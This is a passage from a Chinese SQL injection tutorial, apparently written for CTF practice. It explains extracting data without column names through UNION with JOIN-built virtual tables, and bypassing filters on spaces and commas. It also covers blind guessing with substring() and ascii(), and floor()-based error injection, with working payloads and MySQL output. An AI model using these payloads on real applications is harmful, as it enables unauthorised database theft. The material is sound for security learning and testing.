****
将一列数据进行拼接，非常便利的函数,一般与union一起使用，就像本节的第一小节给出的最后一个例子一样。
**0x04 利用虚拟表在不知道字段名的情况下出数据**
****
先上一道ctf题的payload进行分析：
    -1 UNION ALL 
    SELECT * FROM (
        (SELECT 1)a JOIN (
            SELECT F.4 from (
                SELECT * FROM (SELECT 1)u JOIN (SELECT 2)i JOIN (SELECT 3)o JOIN (SELECT 4)r 
                UNION 
                SELECT * FROM NEWS LIMIT 1 OFFSET 4
            )F
        )b 
    JOIN (SELECT 3)c JOIN (SELECT 4)d
    )
正常版：
    -1 UNION ALL SELECT * FROM ((SELECT 1)a JOIN (SELECT F.4 from (SELECT * FROM (SELECT 1)u JOIN (SELECT 2)i JOIN (SELECT 3)o JOIN (SELECT 4)r UNION SELECT * FROM NEWS LIMIT 1 OFFSET 4)F)b JOIN (SELECT 3)c JOIN (SELECT 4)d)
这本是一道ctf题，前面估计是where后面的子句。这道题过滤了三样东西：1、空格，2、逗号，3、字段名
这里不详细说绕过，方法很多，空格利用%0a绕过，union指令中的逗号利用join绕过，limit指令中的逗号利用offset绕过。
这里因为payload中不能出现字段名，因此我们创建了一个与所查表字段数相同的虚拟表并对其并将其查询结果与前面的查询union起来。具体来说是这样：
— 比如说在原查询的第二字段处出数据
    ... where ... 
    union all
    select * from(
        (select 1)a join(
            select F.[需要查询的字段号] from(
                select * from [需要查询的表有多少个字段就join多少个]
                union
                select * from [需要查询的表] [limit子句]
            )F-- 我们创建的虚拟表没有表名，因此定义一个别名，然后直接[别名].[字段号]查询数据
        )b-- 同上[还差多少字段就再join多少个，以满足字段数相同的原则]
    )
正常版：
    ... where ... union all select * from((select 1)a join(select F.[需要查询的字段号] from(select * from [需要查询的表有多少个字段就join多少个] union select * from [需要查询的表] [limit子句])F)b[还差多少字段就再join多少个，以满足字段数相同的原则])
payload中的join换成逗号亦可。
我们平时使用union时都是将 **union select 1,2,3,4…** 写在后面以填充不存在的数据并测试字段数。在这种操作中我们把
**union select 1,2,3,4…**
写在了前面来充当虚拟表的字段名。本质上来说并不是不知道字段名，而是把不知道字段名的表的查询结果和我们创建的字段名为1,2,3,4…的虚拟表的交集作为一个结果集返回。
这里有一个点，方括号内的limit子句需要特别注意，要取下面这个子查询↓
    select F.[需要查询的字段号] from(select * from [需要查询的表有多少个字段就join多少个] union select * from [需要查询的表] [limit子句]
结果集的最后一行，因为我们需要的数据被union拼到了最后一行（在我们需要的数据只有一行的情况下）。
如果我们需要的东西不止一行会怎么样呢？一段简单的测试：
    mysql> select * from learning_test union all SELECT * FROM ((SELECT 1)a JOIN (SELECT F.1 from (SELECT * FROM (SELECT 1)u UNION SELECT * FROM test_table LIMIT 2 OFFSET 1)F)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (select 5)e);
    +------+---------+---------+---------+-------------+
    | num  | column2 | column3 | column4 | bin_column  |
    +------+---------+---------+---------+-------------+
    |    1 | a       | s       | s       | aaaaaaaaa   |
    |    2 | b       | s       | s       | dddd        |
    |    3 | c       | s       | s       | wwwwwwww    |
    |    4 | d       | s       | s       | ffffffff    |
    |    1 | 2       | 3       | 4       | 5           |
    |    1 | 3       | 3       | 4       | 5           |
    +------+---------+---------+---------+-------------+
    6 rows in set (0.00 sec)
并不会报错，我们需要的查询结果就是第5，6行第2字段的2和3。
下面是对虚拟表的简单测试：
    mysql> select * from ((select 1)a join (select 2)b) limit 1 offset 1;
    Empty set (0.00 sec)
    mysql> select * from ((select 1)a join (select 2)b);
    +---+---+
    | 1 | 2 |
    +---+---+
    | 1 | 2 |
    +---+---+
    1 row in set (0.00 sec)
可以看到我们创建的确实是字段名为1和2的虚拟表，此表的结构为一行两列。
用虚拟表去union其他表的数据：
    mysql> select * from ((select 233)a,(select 2333)b,(select 23333)c,(select 233333)d,(select 2333333)e) union select * from learning_test;
    +------+------+-------+--------+-------------+
    | 233  | 2333 | 23333 | 233333 | 2333333     |
    +------+------+-------+--------+-------------+
    |  233 | 2333 | 23333 | 233333 | 2333333     |
    |    1 | a    | s     | s      | aaaaaaaa    |
    |    2 | b    | s     | s      | ddd         |
    |    3 | c    | s     | s      | wwwwwwww    |
    |    4 | d    | s     | s      | fffffff     |
    +------+------+-------+--------+-------------+
    5 rows in set (0.00 sec)
表明我们之前的分析是正确的，方法可行。
**0x05 substring()和ascii()的联合使用**
****
用于猜解数据库名、表名、字段名和查询结果等
具体使用：
    mysql> select ascii((select substring((select bin_column from learning_test where num=2),1,1)))>10;
    +--------------------------------------------------------------------------------------+
    | ascii((select substring((select bin_column from learning_test where num=2),1,1)))>10 |
    +--------------------------------------------------------------------------------------+
    |                                                                                    1 |
    +--------------------------------------------------------------------------------------+
    1 row in set (0.02 sec)
看到返回了1，也就是说select bin_column from learning_test where
num=2这个查询语句返回的结果集的第一个字符的ascii码确实是大于10的。当然这个过程是繁琐的，可以使用脚本进行自动化猜解，或使用sqlmap中集成的类似的自动化注入功能。
**0x06 利用floor()报错注入**
****
**payload：**
    ...and (select count(*),concat(version(),floor(rand(0)*8))x from information_schema.tables group by x)a;
或
    ...and (select count(*) from (select 1 union select null union select !1)x group by concat(version(),floor(rand(0)*2)))